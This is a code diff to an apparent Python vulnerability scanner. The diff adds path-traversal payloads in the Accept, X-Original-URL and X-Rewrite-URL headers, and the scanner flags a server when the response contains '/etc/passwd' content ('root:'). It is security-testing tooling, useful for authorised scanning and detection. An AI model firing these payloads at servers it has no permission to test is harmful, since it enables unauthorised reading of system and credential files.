@@ -1,20 +1,25 @@
 #!/usr/bin/env python3
 from requests import get
 from urllib.parse import urlparse
+from core import good
 import sys
 
 
 def scan(host):
     try:
         payloads = {
-                '../../../../../../../../../../etc/passwd{{':'root:'
+                'Accept ../../../../../../../../../../etc/passwd{{':'root:',
+                'X-Original-URL /etc/passwd':'root:',
+                'X-Original-URL ../../../../../../../etc/passwd':'root:',
+                'X-Rewrite-URL ../../../../../../../etc/passwd':'root:',
+                'X-Rewrite-URL /etc/passwd':'root:'
         }
         for payload,msg in payloads.items():
-            r = get(host,headers={'Accept':payload},verify=False,allow_redirects=False)
+            r = get(host,headers={payload.split(' ')[0]:payload.split(' ')[1]},verify=False,allow_redirects=False)
             if r != 0:
                 try:
                     if msg.encode() in r.content:
-                        print(f'[+] Found :> {host}')
+                        print(f"""{good} Found :> {host} | {payload.split(' ')[0]+": "+payload.split(' ')[1]}""")
                 finally:
                     pass
     finally:
@@ -22,4 +27,4 @@ def scan(host):
 
 
 def main(opts):
-    scan(opts['url'])
+    scan(opts)
